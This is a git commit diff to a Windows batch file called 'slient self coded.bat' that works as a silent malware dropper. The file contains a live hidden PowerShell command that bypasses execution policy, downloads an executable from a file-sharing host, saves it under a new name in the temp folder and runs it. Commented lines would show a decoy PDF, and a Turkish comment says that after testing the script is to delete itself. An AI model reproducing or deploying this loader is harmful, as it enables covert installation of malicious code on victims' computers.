fb074ab071172560e79e5fb9ee078364e2d3ad92
Re-Edit <146856816+Re-Edit@users.noreply.github.com>
2023-12-05 21:19:13 +0300

    Update slient self coded.bat

--- slient self coded.bat
+++ slient self coded.bat
@@ -1,14 +1,16 @@
 @echo off
 
-:: Sigortacılar için bu özelliği aç +1
+:: PDF
 :: set "DesktopFolder=%userprofile%\Desktop"
 
 :: DownloadFile('URL'
 :: GetTempPath(), 'FILENAME')) x2
 powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('https://filebin.net/pw27dn59l3qs0zxo/testapp.renamed.exe', [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'fes.exe')); Start-Process -FilePath ([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'fes.exe')) -Wait"
 
+:: PDF
 ::powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -NoProfile -Command "(New-Object System.Net.WebClient).DownloadFile('https://pdfindirme.link/pdf.pdf', '%DesktopFolder%\pdfismi.pdf')"
 
+:: PDF
 :: start "" "%DesktopFolder%\pdfismi.pdf"
 
 :: Bu özelliği testten sonra açarsınız çünkü bat dosyasını siliyor bilginize
